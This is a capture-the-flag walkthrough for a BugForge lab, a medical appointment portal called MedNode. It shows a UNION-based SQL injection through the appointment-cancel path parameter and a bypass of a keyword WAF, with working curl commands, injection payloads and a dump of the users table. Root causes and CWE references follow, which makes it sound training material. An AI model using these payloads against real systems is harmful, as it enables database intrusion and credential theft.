# medode-001 - BugForge Lab Walkthrough

**URL:** https://lab-1784665505115-6xbi0j.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** SQL Injection (UNION-based) via URL path parameter, WAF keyword filter bypass
**Flag:** `bug{GdjpRTnxMpEszVc8FVNkqLGrOYxqOuPm}`

---

## Summary

MedNode is a medical appointment portal (Express.js, server-rendered HTML + vanilla JS, JWT auth, SQLite). The `POST /api/appointments/:id/cancel` endpoint concatenates the `:id` path parameter directly into a SQL query. A keyword-based WAF blocks `OR` and `;` but not `UNION SELECT`, allowing a UNION-based injection that dumps arbitrary table contents through the JSON response of the cancel action. The flag is stored directly in the `password` column of every seeded user account.

## Tech Stack

- Express.js (`x-powered-by: Express`)
- Server-rendered HTML pages (`/login.html`, `/register.html`, `/patient-dashboard.html`) + vanilla JS (`/js/patient.js`, `/js/auth.js`)
- JWT (HS256) stored in `localStorage`, roles: `doctor` / `patient`
- SQLite backend, tables: `users`, `appointments`, `appointment_requests`, `reasons`, `sqlite_sequence`

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/auth/register` | none | `{username, password, full_name}` - always creates `role:patient` |
| `POST /api/auth/login` | none | returns JWT |
| `GET /api/appointments` | Bearer | list own appointments |
| `POST /api/appointments` | Bearer | book appointment (`doctor_id`, `appointment_date`, `appointment_time`, `reason_id`) |
| `POST /api/appointments/:id/cancel` | Bearer | vulnerable - `:id` concatenated unparameterized into SQL |
| `GET /api/doctors`, `/api/reasons` | Bearer | lookup lists |

## Attack Chain

1. Register and log in as a patient:
   ```bash
   TARGET="https://lab-1784665505115-6xbi0j.labs-app.bugforge.io"

   curl -s -X POST "$TARGET/api/auth/register" -H "Content-Type: application/json" \
     -d '{"username":"pentest1","password":"Password123!","full_name":"Pentest One"}'
   curl -s -X POST "$TARGET/api/auth/login" -H "Content-Type: application/json" \
     -d '{"username":"pentest1","password":"Password123!"}'
   ```

2. Book a throwaway appointment to get a valid ID to pivot from:
   ```bash
   curl -s -X POST "$TARGET/api/appointments" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"doctor_id":1,"appointment_date":"2026-08-15","appointment_time":"10:00","reason_id":1}'
   ```

3. Confirm SQLi on the cancel path param (single quote breaks the query):
   ```bash
   curl -s -X POST "$TARGET/api/appointments/5'/cancel" -H "Authorization: Bearer $TOKEN"
   # -> {"error":"unrecognized token: \"'\""}
   ```

4. WAF check - `OR` is blocked (`{"error":"Forbidden"}`), `UNION SELECT` is not.

5. Determine column count by incrementing NULLs until the error disappears - 7 columns:
   ```bash
   curl -s -X POST "$TARGET/api/appointments/0%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--/cancel" \
     -H "Authorization: Bearer $TOKEN"
   # -> {"message":"Appointment cancelled","appointment":{"id":null,...}}  (7 nulls)
   ```

6. Enumerate tables via `sqlite_master`:
   ```
   0 UNION SELECT group_concat(name,'|'),NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
   -> users|sqlite_sequence|reasons|appointment_requests|appointments
   ```

7. Dump `users` table content directly through the response `appointment.id` field:
   ```
   0 UNION SELECT group_concat(id||':'||username||':'||password||':'||role||':'||full_name,'||'),NULL,NULL,NULL,NULL,NULL,NULL FROM users--
   ```
   Result:
   ```
   1:dr.smith:bug{GdjpRTnxMpEszVc8FVNkqLGrOYxqOuPm}:doctor:Dr. Sarah Smith
   2:dr.jones:bug{GdjpRTnxMpEszVc8FVNkqLGrOYxqOuPm}:doctor:Dr. Marcus Jones
   3:jeremy:bug{GdjpRTnxMpEszVc8FVNkqLGrOYxqOuPm}:patient:jeremy
   4:jessamy:bug{GdjpRTnxMpEszVc8FVNkqLGrOYxqOuPm}:patient:jessamy
   5:pentest1:$2a$10$...(real bcrypt hash, own account)
   ```
   The flag is stored in the `password` field of every seeded account - no cracking needed, it's returned in plaintext by the injection itself.

## Discovery Notes

Reading `/js/patient.js` immediately showed the vulnerable call: `fetch(\`/api/appointments/${id}/cancel\`, {method:'POST', ...})` with `id` taken straight from the rendered appointment list. The client never sanitizes it, and the request has no body, so the only injectable surface is the path segment itself.

## Dead Ends

| Attempted | Result | Lesson |
|---|---|---|
| `OR 1=1` in path | `{"error":"Forbidden"}` - WAF blocked | Keyword-based WAF blocks `OR`, not `UNION` |
| `UNION SELECT NULL...` (1-6 cols) | Column count mismatch error | SQLite forces exact column-count match; had to increment |
| Checked `appointments`/`appointment_requests` schema for a `flag` column | None present | Flag lives in `users.password`, not a dedicated column - always check every table |

## Root Causes

- `:id` path parameter concatenated directly into a raw SQL string instead of using a parameterized query / prepared statement.
- The WAF is a keyword blocklist (`OR`, `;`) rather than a real query parser - trivially bypassed with `UNION SELECT`.
- The cancel endpoint echoes the resulting "appointment" row back in the JSON response, turning a write action into a data-exfiltration oracle.
- Seeded accounts store the flag literally in the `password` field instead of a hash, so any read primitive on `users` yields immediate compromise.

## CWE / OWASP

- CWE-89: SQL Injection
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic
- OWASP A03:2021 - Injection
